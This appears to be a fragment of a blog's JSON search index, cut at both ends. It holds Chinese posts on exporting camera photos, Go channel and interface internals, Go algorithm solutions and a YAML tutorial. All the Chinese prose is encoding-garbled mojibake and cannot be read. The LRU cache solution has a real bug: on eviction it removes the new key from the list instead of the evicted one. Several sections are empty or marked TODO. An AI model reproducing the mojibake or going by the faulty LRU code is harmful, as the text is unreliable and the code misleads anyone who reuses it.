Mobile->è¿æ¥è£…ç½®->æŸ¥çœ‹ç…§ç‰‡\n\n<!-- more -->\n\n### 2. ç…§ç‰‡å¯¼å‡ºåˆ° macbook\n\nç¡¬ç›˜å¤ªå°æ”¾å¼ƒ\n\n\n\n### 3. ç…§ç‰‡å¯¼å‡ºåˆ° windows\n\n1. ç”¨æ•°æ®çº¿è¿æ¥\n\n2. å‡ºç°Uç›˜, DCIMæ–‡ä»¶å¤¹å†…, æ˜¯ç…§ç‰‡, ç›´æ¥å‰ªåˆ‡å‡ºæ¥\n\n3. è§†é¢‘æ˜¯åœ¨PRIVATEæ–‡ä»¶å¤¹å†…\n","tags":["æ‘„å½±"],"categories":["æ‘„å½±"]},{"title":"channel,goroutineå’Œinterfaceåº•å±‚å®ç°","url":"%2Fp%2F94554c31.html","content":"\n# 1. channel \n\næºç è·¯å¾„ï¼š https://github.com/golang/go/blob/master/src/runtime/chan.go\n\n```go\ntype hchan struct {\n\tqcount   uint           // total data in the queue\n\tdataqsiz uint           // size of the circular queue\n\tbuf      unsafe.Pointer // points to an array of dataqsiz elements\n\telemsize uint16\n\tclosed   uint32\n\telemtype *_type // element type\n\tsendx    uint   // send index\n\trecvx    uint   // receive index\n\trecvq    waitq  // list of recv waiters\n\tsendq    waitq  // list of send waiters\n\n\t// lock protects all fields in hchan, as well as several\n\t// fields in sudogs blocked on this channel.\n\t//\n\t// Do not change another G's status while holding this lock\n\t// (in particular, do not ready a G), as this can deadlock\n\t// with stack shrinking.\n\tlock mutex\n}\n```\n\n<!-- more -->\n\n### 1.1 è¯´æ˜\n\nbuf æŒ‡å‘åº•å±‚å¾ªç¯æ•°ç»„ï¼Œåªæœ‰ç¼“å†²å‹çš„ channel æ‰æœ‰ã€‚\n\nsendxï¼Œrecvx å‡æŒ‡å‘åº•å±‚å¾ªç¯æ•°ç»„ï¼Œè¡¨ç¤ºå½“å‰å¯ä»¥å‘é€å’Œæ¥æ”¶çš„å…ƒç´ ä½ç½®ç´¢å¼•å€¼ï¼ˆç›¸å¯¹äºåº•å±‚æ•°ç»„ï¼‰ã€‚\n\nsendqï¼Œrecvq åˆ†åˆ«è¡¨ç¤ºè¢«é˜»å¡çš„ goroutineï¼Œè¿™äº› goroutine ç”±äºå°è¯•è¯»å– channel æˆ–å‘ channel å‘é€æ•°æ®è€Œè¢«é˜»å¡ã€‚\n\nlock ç”¨æ¥ä¿è¯æ¯ä¸ªè¯» channel æˆ–å†™ channel çš„æ“ä½œéƒ½æ˜¯åŸå­çš„ã€‚\n\nåº•å±‚æœ‰ä¸ª buf, æœ‰ç¼“å†²çš„ channel æ‰æœ‰, è¿˜æœ‰ä¸€ä¸ªå‘é€å’Œæ¥æ”¶çš„ç´¢å¼•, å‘é€å’Œæ¥æ”¶çš„ goutine.\n\n### 1.2 ä½¿ç”¨\n\n```go\nch := make(chan Task, 3)\n```\n\nåˆ›å»ºchannelå®é™…ä¸Šå°±æ˜¯åœ¨å†…å­˜ä¸­å®ä¾‹åŒ–äº†ä¸€ä¸ª`hchan`çš„ç»“æ„ä½“ï¼Œå¹¶è¿”å›ä¸€ä¸ªchæŒ‡é’ˆï¼Œæˆ‘ä»¬ä½¿ç”¨è¿‡ç¨‹ä¸­channelåœ¨å‡½æ•°ä¹‹é—´çš„ä¼ é€’éƒ½æ˜¯ç”¨çš„è¿™ä¸ªæŒ‡é’ˆï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå‡½æ•°ä¼ é€’ä¸­æ— éœ€ä½¿ç”¨channelçš„æŒ‡é’ˆï¼Œè€Œç›´æ¥ç”¨channelå°±è¡Œäº†ï¼Œå› ä¸ºchannelæœ¬èº«å°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚\n\n+ å‘é€ä¸­\n\n![1](channel,goroutineå’Œinterfaceåº•å±‚å®ç°/1.gif)\n\n\n\n+ å‘é€æ»¡\n\n  å½“G1å‘bufå·²ç»æ»¡äº†çš„chå‘é€æ•°æ®çš„æ—¶å€™ï¼Œå½“runtineæ£€æµ‹åˆ°å¯¹åº”çš„hchançš„bufå·²ç»æ»¡äº†ï¼Œä¼šé€šçŸ¥è°ƒåº¦å™¨ï¼Œè°ƒåº¦å™¨ä¼šå°†G1çš„çŠ¶æ€è®¾ç½®ä¸ºwaiting, ç§»é™¤ä¸çº¿ç¨‹Mçš„è”ç³»ï¼Œç„¶åä»Pçš„runqueueä¸­é€‰æ‹©ä¸€ä¸ªgoroutineåœ¨çº¿ç¨‹Mä¸­æ‰§è¡Œï¼Œæ­¤æ—¶G1å°±æ˜¯é˜»å¡çŠ¶æ€ï¼Œä½†æ˜¯ä¸æ˜¯æ“ä½œç³»ç»Ÿçš„çº¿ç¨‹é˜»å¡ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™åªç”¨æ¶ˆè€—å°‘é‡çš„èµ„æºã€‚\n\n  ```go\n  type hchan struct { \n      ... \n      recvq waitq // list of recv waiters \n      sendq waitq // list of send waiters \n      ... \n  } \n  // \n  type waitq struct { \n      first *sudog \n      last *sudog \n  } \n  ```\n\n  å®é™…ä¸Šï¼Œå½“G1å˜ä¸ºwaitingçŠ¶æ€åï¼Œä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨è‡ªå·±çš„sudogçš„ç»“æ„ï¼Œç„¶åæ”¾åˆ°sendqè¿™ä¸ªlistä¸­ï¼Œsudogç»“æ„ä¸­ä¿å­˜äº†channelç›¸å…³çš„å˜é‡çš„æŒ‡é’ˆ(å¦‚æœè¯¥Goroutineæ˜¯senderï¼Œé‚£ä¹ˆä¿å­˜çš„æ˜¯å¾…å‘é€æ•°æ®çš„å˜é‡çš„åœ°å€ï¼Œå¦‚æœæ˜¯receiveråˆ™ä¸ºæ¥æ”¶æ•°æ®çš„å˜é‡çš„åœ°å€)\n\n  ![1](channel,goroutineå’Œinterfaceåº•å±‚å®ç°/2.png)\n\n+ å–å‡ºæ•°æ®\n\n  å½“G2ä»chä¸­æ¥æ”¶ä¸€ä¸ªæ•°æ®æ—¶ï¼Œä¼šé€šçŸ¥è°ƒåº¦å™¨ï¼Œè®¾ç½®G1çš„çŠ¶æ€ä¸ºrunnableï¼Œç„¶åå°†åŠ å…¥Pçš„runqueueé‡Œï¼Œç­‰å¾…çº¿ç¨‹æ‰§è¡Œ.\n\n  ![1](channel,goroutineå’Œinterfaceåº•å±‚å®ç°/3.png)\n\n\n\n# 2. goroutine\n\n//TODO:\n\n# 3. interface\n\næºç è·¯å¾„ï¼š https://github.com/golang/go/blob/master/src/runtime/runtime2.go\n\n```go\ntype iface struct {\n\ttab  *itab\n\tdata unsafe.Pointer\n}\n\ntype eface struct {\n\t_type *_type\n\tdata  unsafe.Pointer\n}\n```\n\nç»§ç»­çœ‹æºç : https://github.com/golang/go/blob/master/src/runtime/type.go\n\n```go\n\ntype _type struct {\n\tsize       uintptr\n\tptrdata    uintptr // size of memory prefix holding all pointers\n\thash       uint32\n\ttflag      tflag\n\talign      uint8\n\tfieldAlign uint8\n\tkind       uint8\n\t// function for comparing objects of this type\n\t// (ptr to object A, ptr to object B) -> ==?\n\tequal func(unsafe.Pointer, unsafe.Pointer) bool\n\t// gcdata stores the GC type data for the garbage collector.\n\t// If the KindGCProg bit is set in kind, gcdata is a GC program.\n\t// Otherwise it is a ptrmask bitmap. See mbitmap.go for details.\n\tgcdata    *byte\n\tstr       nameOff\n\tptrToThis typeOff\n}\n```\n\n\n\n### 3.1 ä»‹ç»\n\næ ¹æ® interface æ˜¯å¦åŒ…å«æœ‰ methodï¼Œåº•å±‚å®ç°ä¸Šç”¨ä¸¤ç§ struct æ¥è¡¨ç¤ºï¼šiface å’Œ efaceã€‚`eface`è¡¨ç¤ºä¸å« method çš„ interface ç»“æ„ï¼Œæˆ–è€…å« empty interfaceã€‚\n\n`iface` è¡¨ç¤º non-empty interface çš„åº•å±‚å®ç°ã€‚ç›¸æ¯”äº empty interfaceï¼Œnon-empty è¦åŒ…å«ä¸€äº› methodã€‚method çš„å…·ä½“å®ç°å­˜æ”¾åœ¨ itab.fun å˜é‡é‡Œã€‚å¦‚æœ interface åŒ…å«å¤šä¸ª methodï¼Œè¿™é‡Œåªæœ‰ä¸€ä¸ª fun å˜é‡æ€ä¹ˆå­˜å‘¢ï¼Ÿè¿™ä¸ªä¸‹é¢å†ç»†è¯´ã€‚\n\n\n\n### 3.2 itab\n\n```go\ntype itab struct {\n\tinter *interfacetype\n\t_type *_type\n\thash  uint32 // copy of _type.hash. Used for type switches.\n\t_     [4]byte\n\tfun   [1]uintptr // variable sized. fun[0]==0 means _type does not implement inter.\n}\n```\n\n+ interfacetype\n\n   interfacetype åŒ…å«äº†ä¸€äº›å…³äº interface æœ¬èº«çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ package pathï¼ŒåŒ…å«çš„ methodã€‚\n\n  ```go\n  type interfacetype struct {\n      typ     _type\n      pkgpath name\n      mhdr    []imethod\n  }\n\n  type imethod struct {   //è¿™é‡Œçš„ method åªæ˜¯ä¸€ç§å‡½æ•°å£°æ˜çš„æŠ½è±¡ï¼Œæ¯”å¦‚  func Print() error\n      name nameOff\n      ityp typeOff\n  }\n  ```\n\n+ _type \n\n  _type è¡¨ç¤º concrete typeã€‚\n\n+ fun\n\n  fun è¡¨ç¤ºçš„ interface é‡Œé¢çš„ method çš„å…·ä½“å®ç°ã€‚\n\n  æ¯”å¦‚ interface type åŒ…å«äº† method A, Bï¼Œåˆ™é€šè¿‡ fun å°±å¯ä»¥æ‰¾åˆ°è¿™ä¸¤ä¸ª method çš„å…·ä½“å®ç°ã€‚è¿™é‡Œæœ‰ä¸ªé—®é¢˜ fun æ˜¯é•¿åº¦ä¸º 1 çš„ uintptr æ•°ç»„ï¼Œé‚£ä¹ˆæ€ä¹ˆè¡¨ç¤ºå¤šä¸ª method å‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸€ä¸‹ runtime åŒ…çš„ additab å‡½æ•°ã€‚\n\n  ```go\n  func additab(m *itab, locked, canfail bool) {\n      ...\n      *(*unsafe.Pointer)(add(unsafe.Pointer(&m.fun[0]), uintptr(k)*sys.PtrSize)) = ifn\n      ...\n  }\n  ```\n\n  ä¸Šé¢çš„ä»£ç çš„æ„æ€æ˜¯åœ¨ fun[0] çš„åœ°å€åé¢ä¾æ¬¡å†™å…¥å…¶ä»– method å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆã€‚ç†Ÿæ‚‰ C++ çš„åŒå­¦å¯ä»¥ç±»æ¯” C++ çš„è™šå‡½æ•°è¡¨æŒ‡é’ˆæ¥çœ‹ã€‚\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/27917262\n+ https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-channel/\n+ https://www.cnblogs.com/qcrao-2018/p/11220651.html\n+ https://draveness.me/golang/docs/part2-foundation/ch04-basic/golang-interface\n+ http://legendtkl.com/2017/07/01/golang-interface-implement/\n","tags":["golang"],"categories":["golang"]},{"title":"å¸¸è§ç®—æ³•çš„golangå®ç°","url":"%2Fp%2F3850b4cc.html","content":"\n# 1. é“¾è¡¨\n\n### 1.1 ç¿»è½¬é“¾è¡¨\n\n+ https://leetcode-cn.com/problems/reverse-linked-list/\n\n\n+ é€’å½’ç‰ˆæœ¬\n\n```go\nfunc reverseList(head *ListNode) *ListNode {\n    if head == nil || head.Next == nil{\n        return head\n    }\n    p := reverseList(head.Next)\n    head.Next.Next = head \n    head.Next = nil\n    return p\n}\n```\n\n<!-- more -->\n\n+ å¾ªç¯ç‰ˆæœ¬\n\n```go\nfunc reverseList(head *ListNode) *ListNode {\n    var prev,curr *ListNode\n    \n    curr = head\n    for curr != nil {\n        tmp := curr.Next\n        curr.Next = prev\n        prev = curr\n        curr = tmp\n    }\n    return prev\n}\n```\n\n\n\n### 1.2 é“¾è¡¨æœ‰ç¯å’Œå…¥å£\n\n+ https://leetcode-cn.com/problems/linked-list-cycle/\n\n+ https://leetcode-cn.com/problems/linked-list-cycle-ii/\n\n+ hash\n\n  key å­˜å‚¨èŠ‚ç‚¹çš„å¼•ç”¨, ç¯çš„å…¥å£å°±æ˜¯ç¬¬ä¸€ä¸ªé‡å¤çš„\n\n+ å¿«æ…¢æŒ‡é’ˆ \n\n  å¤´ç»“ç‚¹å’Œç›¸é‡èŠ‚ç‚¹ç¦»å…¥å£ç‚¹è·ç¦»ä¸€æ ·\n\n```go\nfunc hasCycle(head *ListNode) bool {\n    slow := head\n    fast := head\n    for (fast != nil && fast.Next != nil){  // ä¸€å®šè¦åˆ¤æ–­ fast\n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            return true\n        }\n    }\n    return false\n}\n```\n\n+ æ‰¾å…¥å£\n\n```go\nfunc detectCycle(head *ListNode) *ListNode {\n    slow := head\n    fast := head\n    cycle := false\n    for (fast != nil && fast.Next != nil){ // ä¸€å®šè¦åˆ¤æ–­ fast\n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            cycle = true\n            break\n        }\n    }\n    if !cycle{\n        return nil\n    }\n\n    p1 := head\n    p2 := slow // æˆ–è€… fast\n    for p1 != p2 {\n        p1 = p1.Next\n        p2 = p2.Next\n    }\n    return p1\n}\n```\n\n\n\n### 1.3 ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹\n\n+ https://leetcode-cn.com/problems/swap-nodes-in-pairs/\n\n  ```go\n  func swapPairs(head *ListNode) *ListNode {\n      if head == nil || head.Next == nil{\n          return head\n      }\n  \n      //è¿™ä¸€å±‚3ä¸ªèŠ‚ç‚¹, head, next, swapPairs()\n      //æ¢æˆ next, head, swapPairs()\n  \n      next := head.Next\n      head.Next = swapPairs(next.Next)\n      next.Next = head\n  \n      return next\n  }\n  ```\n\n\n\n\n### 1.4 åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨\n\n+ https://leetcode-cn.com/problems/merge-two-sorted-lists/\n\n  ```go\n  func mergeTwoLists(l1 *ListNode, l2 *ListNode) *ListNode {\n      if l1 == nil{\n          return l2\n      }\n      if l2 == nil {\n          return l1\n      }\n      \n      if l1.Val < l2.Val {\n          l1.Next = mergeTwoLists(l1.Next, l2)\n          return l1\n      }else {\n          l2.Next = mergeTwoLists(l1, l2.Next)\n          return l2\n      }\n  }\n  ```\n\n  \n\n\n\n# 2. æ’åº\n\n### 2.1 å¿«é€Ÿæ’åº\n\n+ https://leetcode-cn.com/problems/sort-an-array/\n\n  ```go\n  func parition(nums []int, left, right int)  int{\n  \n      tmp := nums[left]\n  \n      for (left < right){\n          for (left < right && nums[right] >= tmp) {\n              right--\n          }\n          nums[left],nums[right] = nums[right],nums[left]\n          \n          for (left < right && nums[left] <= tmp) {\n              left++\n          }\n          nums[left],nums[right] = nums[right],nums[left]\n      }\n  \n      return left\n  }\n  \n  func quickSort(nums []int, left, right int) {\n      if left >= right{\n          return\n      }\n      mid := parition(nums, left, right)\n      quickSort(nums, left, mid-1)\n      quickSort(nums, mid+1, right)\n  }\n  \n  func sortArray(nums []int) []int {\n      quickSort(nums,0,len(nums)-1)\n      return nums\n  }\n  ```\n\n\n\n\n\n### 2.2 å½’å¹¶æ’åºTODO\n\nå½’å¹¶æ’åºåˆ©ç”¨äº†åˆ†æ²»çš„æ€æƒ³æ¥å¯¹åºåˆ—è¿›è¡Œæ’åºã€‚å¯¹ä¸€ä¸ªé•¿ä¸º n çš„å¾…æ’åºçš„åºåˆ—ï¼Œæˆ‘ä»¬å°†å…¶åˆ†è§£æˆä¸¤ä¸ªé•¿åº¦ä¸º n/2çš„å­åºåˆ—ã€‚æ¯æ¬¡å…ˆé€’å½’è°ƒç”¨å‡½æ•°ä½¿ä¸¤ä¸ªå­åºåˆ—æœ‰åºï¼Œç„¶åæˆ‘ä»¬å†çº¿æ€§åˆå¹¶ä¸¤ä¸ªæœ‰åºçš„å­åºåˆ—ä½¿æ•´ä¸ªåºåˆ—æœ‰åºã€‚\n\n\n\n### 2.3 å †æ’åº\n\n+ https://www.bilibili.com/video/BV1Eb41147dK\n\n1. å †æ’åºçš„æ€æƒ³å°±æ˜¯å…ˆå°†å¾…æ’åºçš„åºåˆ—å»ºæˆå¤§æ ¹å †ï¼Œä½¿å¾—æ¯ä¸ªçˆ¶èŠ‚ç‚¹çš„å…ƒç´ å¤§äºç­‰äºå®ƒçš„å­èŠ‚ç‚¹ã€‚æ­¤æ—¶æ•´ä¸ªåºåˆ—æœ€å¤§å€¼å³ä¸ºå †é¡¶å…ƒç´ ã€‚\n\n2. æˆ‘ä»¬å°†å…¶ä¸æœ«å°¾å…ƒç´ äº¤æ¢ï¼Œä½¿æœ«å°¾å…ƒç´ ä¸ºæœ€å¤§å€¼ï¼Œç„¶åå†è°ƒæ•´å †é¡¶å…ƒç´ ä½¿å¾—å‰©ä¸‹çš„ nâˆ’1 ä¸ªå…ƒç´ ä»ä¸ºå¤§æ ¹å †\n3. å†é‡å¤ 2 çš„æ“ä½œæˆ‘ä»¬å³èƒ½å¾—åˆ°ä¸€ä¸ªæœ‰åºçš„åºåˆ—ã€‚\n\n+ ä¸ºä»€ä¹ˆä¸å°é¡¶å †\n\n  å› ä¸ºå»ºå¥½çš„å°é¡¶å †ä¹Ÿä¸æ˜¯æ’åºå¥½çš„\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc heapify(arr []int, i int, length int) {\n\tif i >= length {\n\t\treturn\n\t}\n\t// iå’Œè‡ªå·±å·¦å­©å­, å³å­©å­å»æ¯”è¾ƒ, å¦‚æœå¤§, å°±äº¤æ¢, ä¿æŒé¡¶éƒ¨æœ€å¤§\n\tmax := i\n\tlChild := i*2 + 1\n\trChild := i*2 + 2\n\tif lChild <= length && arr[lChild] > arr[max] {\n\t\tmax = lChild\n\t}\n\tif rChild <= length && arr[rChild] > arr[max] {\n\t\tmax = rChild\n\t}\n\tif max != i {\n\t\t// äº¤æ¢\n\t\tarr[i], arr[max] = arr[max], arr[i]\n\t\theapify(arr, max, length)\n\t}\n}\n\nfunc main() {\n\tarr := []int{3, 5, 3, 0, 8, 6, 1, 5, 8, 6, 2, 4, 9, 4, 7, 0, 1, 8, 9, 7, 3, 1, 2, 5, 9, 7, 4, 0, 2, 6}\n\tfmt.Println(arr)\n\n\t// æ„å»ºå¤§é¡¶å †\n\tlength := len(arr) - 1\n\tfor i := length / 2; i >= 0; i-- {\n\t\theapify(arr, i, length)\n\t}\n\tfmt.Println(arr)\n\n\t// æ’åº\n\tfor i := length; i >= 1; i-- {\n\t\tarr[i], arr[0] = arr[0], arr[i]\n\t\tlength-- // åˆ‡è…¿\n\t\theapify(arr, 0, length)\n\t}\n\tfmt.Println(arr)\n}\n\n```\n\n\n\n# 3. æ ‘\n\n### 3.1 äºŒå‰æ ‘æœ€å¤§æ·±åº¦\n\n+ https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/\n\n  ```go\n  func maxDepth(root *TreeNode) int {\n      if root == nil{\n          return 0\n      }\n      left := maxDepth(root.Left)\n      right := maxDepth(root.Right)\n      return max(left,right)+1\n  }\n  \n  func max(a,b int) int {\n      if a > b {\n          return a\n      }\n      return b\n  }\n  ```\n\n  \n\n### 3.2 å¹³è¡¡äºŒå‰æ ‘\n\n+ https://leetcode-cn.com/problems/balanced-binary-tree/\n\n```go\nfunc isBalanced(root *TreeNode) bool {\n    if root == nil{\n        return true\n    }\n    if !isBalanced(root.Left) || !isBalanced(root.Right){\n        return false\n    }\n    if abs(maxDepth(root.Left)-maxDepth(root.Right)) > 1 {\n        return false\n    }\n    return true\n}\n\nfunc maxDepth(root *TreeNode) int {\n    if root == nil {\n        return 0\n    }\n    return max(maxDepth(root.Left),maxDepth(root.Right)) + 1\n}\n\nfunc max(a,b int) int {\n    if a > b {\n        return a\n    }\n    return b\n}\n\nfunc abs(a int) int {\n    if a < 0 {\n        return -a\n    }\n    return a \n}\n```\n\n\n\n### 3.3 äºŒå‰æœç´¢æ ‘æœ€è¿‘ç¥–å…ˆ\n\n+ https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/\n\n```go\nfunc lowestCommonAncestor(root, p, q *TreeNode) *TreeNode {\n\tval := root.Val\n    pv := p.Val\n    qv := q.Val\n\n    if pv > val && qv > val {\n        return lowestCommonAncestor(root.Right, p, q)\n    }else if pv < val && qv < val {\n        return lowestCommonAncestor(root.Left, p, q)\n    }else{\n        return root\n    }\n}\n```\n\n### 3.4 äºŒå‰æ ‘æœ€è¿‘ç¥–å…ˆ\n\n```go\n\n```\n\n\n\n\n\n# 4. æŸ¥æ‰¾\n\n### 4.1 äºŒåˆ†æŸ¥æ‰¾\n\n+ https://leetcode-cn.com/problems/binary-search/\n\n  ```go\n  func search(nums []int, target int) int {\n      left ,right := 0, len(nums)-1\n    \n      for left <= right {\n          mid := left + (right - left) /2\n          if target == nums[mid] {\n              return mid\n          }else if target > nums[mid]{\n              left = mid+1\n          }else{\n              right = mid-1\n          }\n      }\n      \n    \treturn -1\n  }\n  ```\n\n  \n\n# 8. å…¶ä»–\n\n### 8.1 LRU\n\n+ https://leetcode-cn.com/problems/lru-cache/solution/\n\n  ```go\n  type LRUCache struct {\n      Capacity int\n      Map map[int]int\n      List []int\n  }\n  \n  \n  func Constructor(capacity int) LRUCache {\n    return LRUCache{\n          Capacity : capacity,\n          Map : make(map[int]int, 0),\n          List : make([]int, 0),\n      }\n  }\n  \n  func DelKey(a []int, key int) []int{\n      for i := 0; i < len(a); i++ {\n  \t\tif a[i] == key {\n              return append(a[:i], a[i+1:]...)\n  \t\t}\n  \t}\n  \treturn a[1:len(a)]\n  }\n  \n  func (this *LRUCache) Get(key int) int {\n      if val, ok := this.Map[key]; ok{\n          this.List = DelKey(this.List, key)\n          this.List = append(this.List, key)\n          return val\n      }\n      return -1\n  }\n  \n  \n  func (this *LRUCache) Put(key int, value int)  {\n  \n      if _, ok := this.Map[key]; ok{\n          this.Map[key] = value\n          this.List = DelKey(this.List, key)\n          this.List = append(this.List, key)\n          return \n      }\n  \n      if len(this.Map) >= this.Capacity{\n          delKey := this.List[0]      \n          this.List = DelKey(this.List, key)\n          delete(this.Map, delKey)\n      }\n  \n      this.Map[key] = value\n      this.List = append(this.List, key)\n  }\n  ```\n  \n\n\n\n### 8.2 æ¸©åº¦\n\n+ https://leetcode-cn.com/problems/daily-temperatures/\n\n\n\n# 9. è„‘åŠ›é£æš´\n\n### 9.1 é€’å½’\n\n+ ç¬¬ä¸€æ­¥è€ƒè™‘å‡ºå£\n\n+ ç¬¬äºŒæ­¥, ä¸ºäº†ç›®çš„, æˆ‘åº”è¯¥å®Œæˆæ€ä¹ˆæ ·çš„è¿”å›å€¼\n\n+ ç¬¬ä¸‰æ­¥, ä¾‹å¦‚è€ƒè™‘å€’æ•°ç¬¬äºŒå±‚æˆ–ç®€å•ç†è§£çš„å±‚, åªè€ƒè™‘å½“å‰å±‚çš„é€»è¾‘\n\n  \n\n# 10. å…¶ä»–TODO\n\näºŒåˆ†æŸ¥æ‰¾\n\nåè½¬å­—ç¬¦ä¸² \n\nå›æ–‡å­—ç¬¦ä¸²\n\næœ€é•¿å…¬ç”¨å­ä¸²\n\nKMP\n\n\n\n# 11. å‚è€ƒèµ„æ–™\n\n+ https://labuladong.gitbook.io/\n+ https://lyl0724.github.io/2020/01/25/1/","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"YAMLè¯­è¨€æ•™ç¨‹","url":"%2Fp%2Ff2ad59fc.html","content":"\n## YAMLä»‹ç»\n\nYAML è¯­è¨€ï¼ˆå‘éŸ³ /ËˆjÃ¦mÉ™l/ ï¼‰çš„è®¾è®¡ç›®æ ‡ï¼Œå°±æ˜¯æ–¹ä¾¿äººç±»è¯»å†™ã€‚å®ƒå®è´¨ä¸Šæ˜¯ä¸€ç§é€šç”¨çš„æ•°æ®ä¸²è¡ŒåŒ–æ ¼å¼ã€‚å®ƒçš„åŸºæœ¬è¯­æ³•è§„åˆ™å¦‚ä¸‹ã€‚\n\n- å¤§å°å†™æ•æ„Ÿ\n- ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»\n- ç¼©è¿›æ—¶ä¸å…è®¸ä½¿ç”¨Tabé”®ï¼Œåªå…è®¸ä½¿ç”¨ç©ºæ ¼ã€‚\n- ç¼©è¿›çš„ç©ºæ ¼æ•°ç›®ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦ä¾§å¯¹é½å³å¯\n\n\n\nYAML æ”¯æŒçš„æ•°æ®ç»“æ„æœ‰ä¸‰ç§ã€‚\n\n- å¯¹è±¡ï¼šé”®å€¼å¯¹çš„é›†åˆ(map)\n- æ•°ç»„ï¼šä¸€ç»„æŒ‰æ¬¡åºæ’åˆ—çš„å€¼(array)\n- çº¯é‡ï¼ˆscalarsï¼‰ï¼šå•ä¸ªçš„ã€ä¸å¯å†åˆ†çš„å€¼\n\n<!-- more -->\n\n## YAML è¯­æ³•\n\n1.  `#` è¡¨ç¤ºæ³¨é‡Šï¼Œä»è¿™ä¸ªå­—ç¬¦ä¸€ç›´åˆ°è¡Œå°¾ï¼Œéƒ½ä¼šè¢«è§£æå™¨å¿½ç•¥ã€‚\n\n\n\n2. `...` å’Œ`---`é…åˆä½¿ç”¨ï¼Œåœ¨ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­ä»£è¡¨ä¸€ä¸ªæ–‡ä»¶çš„ç»“æŸï¼š\n\n\n   ```\n---\ntime: 20:03:20\nplayer: Sammy Sosa\naction: strike (miss)\n...\n\n---\ntime: 20:03:47\nplayer: Sammy Sosa\naction: grand slam\n...\n   ```\n\n  ç›¸å½“äºåœ¨ä¸€ä¸ªyamlæ–‡ä»¶ä¸­è¿ç»­å†™äº†ä¸¤ä¸ªyamlé…ç½®é¡¹ã€‚\n\n\n\n#### å¯¹è±¡\n\nå¯¹è±¡çš„ä¸€ç»„é”®å€¼å¯¹ï¼Œä½¿ç”¨å†’å·ç»“æ„è¡¨ç¤ºã€‚\n\n```javascript\nanimal: pets\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ animal: 'pets' }\n```\n\nYaml ä¹Ÿå…è®¸å¦ä¸€ç§å†™æ³•ï¼Œå°†æ‰€æœ‰é”®å€¼å¯¹å†™æˆä¸€ä¸ªè¡Œå†…å¯¹è±¡ã€‚\n\n```javascript\nhash: { name: Steve, foo: bar } \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ hash: { name: 'Steve', foo: 'bar' } }\n```\n\n\n\nè¾ƒä¸ºå¤æ‚çš„å¯¹è±¡æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨é—®å·åŠ ä¸€ä¸ªç©ºæ ¼ä»£è¡¨ä¸€ä¸ªå¤æ‚çš„keyï¼Œé…åˆä¸€ä¸ªå†’å·åŠ ä¸€ä¸ªç©ºæ ¼ä»£è¡¨ä¸€ä¸ªvalueï¼š\n\n```\n?  \n    - complexkey1\n    - complexkey2\n:\n    - complexvalue1\n    - complexvalue2\n```\n\næ„æ€å³å¯¹è±¡çš„å±æ€§æ˜¯ä¸€ä¸ªæ•°ç»„[complexkey1,complexkey2]ï¼Œå¯¹åº”çš„å€¼ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„[complexvalue1,complexvalue2]\n\n\n\n#### æ•°ç»„\n\nä¸€ç»„è¿è¯çº¿å¼€å¤´çš„è¡Œï¼Œæ„æˆä¸€ä¸ªæ•°ç»„ã€‚\n\n```javascript\n- Cat\n- Dog\n- Goldfish\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n[ 'Cat', 'Dog', 'Goldfish' ]\n```\n\n\n\næ•°æ®ç»“æ„çš„å­æˆå‘˜æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåˆ™å¯ä»¥åœ¨è¯¥é¡¹ä¸‹é¢ç¼©è¿›ä¸€ä¸ªç©ºæ ¼ã€‚\n\n```javascript\n-\n - Cat\n - Dog\n - Goldfish\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n[ [ 'Cat', 'Dog', 'Goldfish' ] ]\n```\n\næ•°ç»„ä¹Ÿå¯ä»¥é‡‡ç”¨è¡Œå†…è¡¨ç¤ºæ³•ã€‚\n\n```javascript\nanimal: [Cat, Dog]\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ animal: [ 'Cat', 'Dog' ] }\n```\n\n#### å¤åˆç»“æ„\n\nå¯¹è±¡å’Œæ•°ç»„å¯ä»¥ç»“åˆä½¿ç”¨ï¼Œå½¢æˆå¤åˆç»“æ„ã€‚\n\n```javascript\nlanguages:\n - Ruby\n - Perl\n - Python \nwebsites:\n YAML: yaml.org \n Ruby: ruby-lang.org \n Python: python.org \n Perl: use.perl.org \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ languages: [ 'Ruby', 'Perl', 'Python' ],\n  websites: \n   { \n     YAML: 'yaml.org',\n     Ruby: 'ruby-lang.org',\n     Python: 'python.org',\n     Perl: 'use.perl.org' \n   } \n}\n```\n\n#### çº¯é‡\n\nçº¯é‡æ˜¯æœ€åŸºæœ¬çš„ã€ä¸å¯å†åˆ†çš„å€¼ã€‚ä»¥ä¸‹æ•°æ®ç±»å‹éƒ½å±äº JavaScript çš„çº¯é‡ã€‚\n\n- å­—ç¬¦ä¸²\n- å¸ƒå°”å€¼\n- æ•´æ•°\n- æµ®ç‚¹æ•°\n- Null\n- 